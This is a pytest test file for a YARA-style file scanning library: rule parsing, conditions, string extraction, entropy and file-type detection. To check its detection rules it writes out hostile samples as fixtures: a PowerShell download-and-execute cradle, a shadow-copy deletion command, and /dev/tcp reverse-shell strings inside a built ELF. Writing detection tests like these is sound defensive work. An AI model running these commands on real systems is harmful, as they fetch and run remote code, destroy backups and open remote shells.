"""scan library: YARA-subset rules, strings extraction, entropy and file type sniffing."""

import json

import pytest

from binfixtures import build_elf, build_pe, pcap_file, sample_capture
from conftest import ROOT, run_tb, tb_error

RULES = ROOT / "apps" / "file-inspector" / "rules.yar"


def tb_path(p):
    return str(p).replace("\\", "/")


def q(text):
    """A Python str as a TB text literal."""
    return json.dumps(text)


def test_parse_a_rule_with_every_section():
    text = ('rule Demo : tag1 tag2 {\n meta:\n  author = "soc"\n  score = 7\n'
            ' strings:\n  $a = "Hello" nocase wide ascii\n  $b = { 4D 5A ?? 00 [2-4] (50|51) }\n'
            '  $c = /ab+c/i\n condition:\n  $a and ($b or $c)\n}')
    out = run_tb(f'import scan\nlet r = scan.rule({q(text)})\n'
                 'say(r.name, r.tags, r.meta)\nsay(r.strings.map(fn(s) { return s.name + ":" + s.kind }))\n'
                 'say(r.strings[0].nocase, r.strings[0].wide, r.condition)')
    assert out == ['Demo ["tag1", "tag2"] {"author": "soc", "score": 7}', '["$a:text", "$b:hex", "$c:regex"]',
                   "true true $a and ($b or $c)"]


@pytest.mark.parametrize("cond,data,hit", [
    ("$a", "xx hello yy", False),
    ("$a", "xx HELLO yy", True),
    ("$a and $b", "HELLO", False),
    ("$a or $b", "WORLD", True),
    ("not $a", "nothing", True),
    ("2 of them", "HELLO WORLD", True),
    ("any of ($a, $b)", "WORLD", True),
    ("all of them", "HELLO", False),
    ("#a >= 2", "HELLO HELLO", True),
    ("#a >= 2", "HELLO", False),
    ("$a at 0", "HELLO there", True),
    ("$a at 0", " HELLO", False),
    ("$a in (0..3)", "  HELLO", True),
    ("@a[1] == 3", "abcHELLO", True),
    ("filesize < 10", "HELLO", True),
    ("filesize > 10", "HELLO", False),
    ("uint8(0) == 0x48", "HELLO", True),
    ("uint16(0) == 0x4548", "HELLO", True),
    ("none of them", "zzz", True),
])
def test_conditions(cond, data, hit):
    rule = f'rule R {{ strings: $a = "HELLO" $b = "WORLD" condition: {cond} }}'
    out = run_tb(f'import scan\nsay(len(scan.bytes({q(data)}, {q(rule)})))')
    assert out == ["1" if hit else "0"], cond


def test_hex_wildcards_jumps_alternatives_and_regex():
    rules = ('rule H { strings: $h = { 4D 5A ?? 00 [1-3] (50|51) 45 } condition: $h }\n'
             'rule X { strings: $r = /ev[i1]l\\.example/ condition: $r }\n'
             'rule W { strings: $w = "secret" wide condition: $w }\n'
             'rule F { strings: $f = "cat" fullword condition: $f }')
    out = run_tb('import scan\n'
                 f'let rules = scan.rules({q(rules)})\n'

                 'let data = b"\\x00MZ\\x90\\x00\\x01\\x02PE and ev1l.example s\\x00e\\x00c\\x00r\\x00e\\x00t\\x00 concat"\n'
                 'let hits = scan.bytes(data, rules)\n'
                 'say(hits.map(fn(h) { return h.rule }))\n'
                 'say(hits[0].strings[0].offset, hits[0].strings[0].length, hits[0].strings[0].data)\n'
                 'say(hits[2].strings[0].data)')
    assert out == ['["H", "X", "W"]', "1 8 4d5a900001025045", "secret"]


def test_map_rules_check_and_load(tmp_path):
    out = run_tb('import scan\nlet r = {"name": "M", "strings": {"a": "abc", "b": {"hex": "61 62"}}, '
                 '"condition": "$a and $b", "meta": {"severity": "low"}}\n'
                 'say(scan.check(r)[0].condition)\nsay(scan.bytes("xxabcxx", [r])[0].meta.severity)\n'
                 'say(len(scan.bytes("xxabcxx", {"name": "N", "strings": {"q": "zzz"}})))')
    assert out == ["$a and $b", "low", "0"]
    loaded = run_tb(f'import scan\nlet rs = scan.load("{tb_path(RULES)}")\nsay(len(rs) >= 8, rs[0].name)')
    assert loaded == ["true PowerShell_Download_Cradle"]


def test_file_and_folder(tmp_path):
    (tmp_path / "sub").mkdir()
    (tmp_path / "a.ps1").write_text("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/x')")
    (tmp_path / "sub" / "b.txt").write_text("vssadmin delete shadows /all /quiet")
    (tmp_path / "c.txt").write_text("nothing to see")
    rules = tb_path(RULES)
    out = run_tb(f'import scan\nimport fs\nlet rs = scan.load("{rules}")\n'
                 f'let one = scan.file("{tb_path(tmp_path / "a.ps1")}", rs)\n'
                 'say(one.map(fn(m) { return m.rule }), one[0].path.ends_with("a.ps1"))\n'
                 f'let all = scan.folder("{tb_path(tmp_path)}", rs)\n'
                 'say(all.map(fn(m) { return fs.name(m.path) + ":" + m.rule }))\n'
                 f'say(len(scan.folder("{tb_path(tmp_path)}", rs, {{"recursive": false}})))')
    assert out[0] == '["PowerShell_Download_Cradle", "URL_To_Bare_IP"] true'
    assert out[1] == '["a.ps1:PowerShell_Download_Cradle", "a.ps1:URL_To_Bare_IP", "b.txt:Shadow_Copy_Deletion"]'
    assert out[2] == "2"


def test_shipped_rules_on_binaries(tmp_path):
    pe = tmp_path / "x.exe"
    pe.write_bytes(build_pe(sections=[(".text", b"\x90" * 64, 0x60000020), ("UPX1", b"\x00" * 64, 0xE0000040)],
                            imports={"KERNEL32.dll": ["VirtualAllocEx", "WriteProcessMemory"]}))
    elf = tmp_path / "x.elf"
    elf.write_bytes(build_elf(sections=[(".rodata", b"/bin/sh\x00/dev/tcp/203.0.113.5/4444\x00", 1, 2),
                                        (".text", b"\x90" * 32, 1, 6)]))
    out = run_tb(f'import scan\nlet rs = scan.load("{tb_path(RULES)}")\n'
                 f'say(scan.file("{tb_path(pe)}", rs).map(fn(m) {{ return m.rule }}))\n'
                 f'say(scan.file("{tb_path(elf)}", rs).map(fn(m) {{ return m.rule }}))')
    assert out == ['["UPX_Packed_PE", "Process_Injection_Imports"]', '["Linux_Reverse_Shell_Strings"]']


def test_strings_entropy_interesting():
    out = run_tb('import scan\n'
                 'let data = b"\\x00\\x01http://198.51.100.7/a.exe\\x00\\x02ab\\x01\\x01C\\x00:\\x00\\\\\\x00T\\x00e\\x00m\\x00p\\x00\\x00"\n'
                 'let s = scan.strings(data)\nsay(s.map(fn(x) { return x.encoding + ":" + x.text }))\nsay(s[0].offset)\n'
                 'say(len(scan.strings(data, 30)), len(scan.strings(data, 4, 1)))\n'
                 'let i = scan.interesting(s)\nsay(i.urls, i.ips)\n'
                 'say(scan.entropy(b"aaaa"), scan.entropy(b"ab"), scan.entropy(""))')
    assert out[0] == '["ascii:http://198.51.100.7/a.exe", "utf-16:C:\\\\Temp"]'
    assert out[1] == "2"
    assert out[2] == "0 1"
    assert out[3] == '["http://198.51.100.7/a.exe"] ["198.51.100.7"]'
    assert out[4] == "0 1 0"


@pytest.mark.parametrize("name,data,kind", [
    ("x.exe", None, "pe"),
    ("x.bin", None, "elf"),
    ("x.pdf", b"%PDF-1.7\n...", "pdf"),
    ("x.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 20, "png"),
    ("x.txt", b"just some words\n", "text"),
    ("x.dat", bytes(range(256)) * 4, "unknown"),
    ("x.pcap", None, "pcap"),
    ("x.evtx", None, "evtx"),
])
def test_file_type(tmp_path, name, data, kind):
    if data is None:
        data = {"pe": lambda: build_pe(), "elf": lambda: build_elf(), "pcap": lambda: pcap_file(sample_capture()[:3]),
                "evtx": lambda: (ROOT / "apps" / "data" / "sample.evtx").read_bytes()}[kind]()
    path = tmp_path / ("renamed-" + name[::-1])  # the name must not matter
    path.write_bytes(data)
    out = run_tb(f'import scan\nlet t = scan.file_type("{tb_path(path)}")\nsay(t.type, t.size)')
    assert out == [f"{kind} {len(data)}"]


def test_friendly_errors(tmp_path):
    assert "couldn't read that rule" in str(tb_error('import scan\nscan.rule("rule { }")'))
    assert "found no rules" in str(tb_error('import scan\nscan.rules("// nothing")'))
    assert "got 2 rules" in str(tb_error('import scan\nscan.rule("rule A { condition: true } rule B { condition: true }")'))
    unknown = q('rule A { strings: $a = "x" condition: $b }')
    msg = str(tb_error(f'import scan\nscan.rule({unknown})'))
    assert "$b" in msg
    xor = q('rule A { strings: $a = "x" xor nocase condition: $a }')
    assert "doesn't allow 'xor' together with 'nocase'" in str(tb_error(f'import scan\nscan.rule({xor})'))
    assert "needs rules" in str(tb_error('import scan\nscan.bytes("x", [])'))
    assert "is a file, not a folder" in str(tb_error(f'import scan\nscan.folder("{tb_path(RULES)}", "rule A {{ condition: true }}")'))
    assert "I couldn't find" in str(tb_error('import scan\nscan.load("missing.yar")'))
    assert "min to be at least 1" in str(tb_error('import scan\nscan.strings("abc", 0)'))


@pytest.mark.parametrize("name", ["pcap", "evtx", "pe", "elf", "scan"])
def test_binary_libraries_are_documented(name):
    import tb
    info = tb.describe_library(name)
    assert info["doc"] and info["functions"]
    for fn in info["functions"]:
        first = fn["signature"]
        assert first.startswith(fn["name"] + "(") and " -> " in first, (name, first)
        assert fn["doc"], (name, fn["name"])
    for value in info["values"]:
        assert value["doc"], (name, value["name"])
